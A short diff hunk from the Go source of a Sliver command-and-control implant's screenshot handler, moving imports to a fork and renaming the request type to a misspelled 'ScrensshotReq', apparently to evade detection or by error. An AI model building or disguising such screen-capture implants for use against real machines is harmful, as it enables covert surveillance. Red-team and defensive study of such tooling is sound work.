@@ -25,13 +25,13 @@ import (
 	"log"
 	// {{end}}
 
-	"github.com/bishopfox/sliver/implant/sliver/screen"
-	"github.com/bishopfox/sliver/protobuf/sliverpb"
+	"github.com/Oni-kuki/sliver/implant/sliver/screen"
+	"github.com/Oni-kuki/sliver/protobuf/sliverpb"
 	"google.golang.org/protobuf/proto"
 )
 
 func screenshotHandler(data []byte, resp RPCResponse) {
-	sc := &sliverpb.ScreenshotReq{}
+	sc := &sliverpb.ScrensshotReq{}
 	err := proto.Unmarshal(data, sc)
 	if err != nil {
 		// {{if .Config.Debug}}
